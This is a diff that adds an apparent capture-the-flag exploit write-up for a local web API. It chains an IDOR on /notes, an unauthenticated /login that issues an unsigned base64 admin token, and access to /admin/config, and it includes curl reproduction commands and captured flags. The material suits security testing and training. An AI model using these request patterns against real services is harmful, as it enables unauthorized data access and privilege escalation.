@@ -1,0 +1,12 @@
+Exploit chain (verified end-to-end against 127.0.0.1:18081 only):
+Step 1 (recon): GET /health -> endpoint list + hint "token=base64({json uid})".
+Step 2 (IDOR): GET /notes?id=2 with no auth -> note "admin-secret-FLAG{idor_user2}". FLAG #1.
+Step 3 (auth bypass): GET /login?user=admin (no credentials) -> {"token":"eyJ1aWQiOiAiMiIsICJ1c2VyIjogImFkbWluIn0=","uid":"2"} unsigned admin token.
+Step 4 (privilege escalation): GET /admin/config with "Authorization: Bearer eyJ1aWQiOiAiMiIsICJ1c2VyIjogImFkbWluIn0=" -> {"flag":"FLAG{api_chain_ok}","debug":true}. FLAG #2. Same via ?token= query param.
+
+Reproduction commands:
+curl -s 'http://127.0.0.1:18081/notes?id=2'
+curl -s 'http://127.0.0.1:18081/login?user=admin'
+curl -s -H 'Authorization: Bearer eyJ1aWQiOiAiMiIsICJ1c2VyIjogImFkbWluIn0=' 'http://127.0.0.1:18081/admin/config'
+
+Impact: unauthenticated horizontal data access (IDOR on /notes) + unauthenticated vertical privilege escalation (login mints admin token with no credential check; token is unsigned base64) yielding admin config flag disclosure. Any anonymous client obtains admin rights and reads all users' notes. /files?name= additionally leaks absolute server paths.
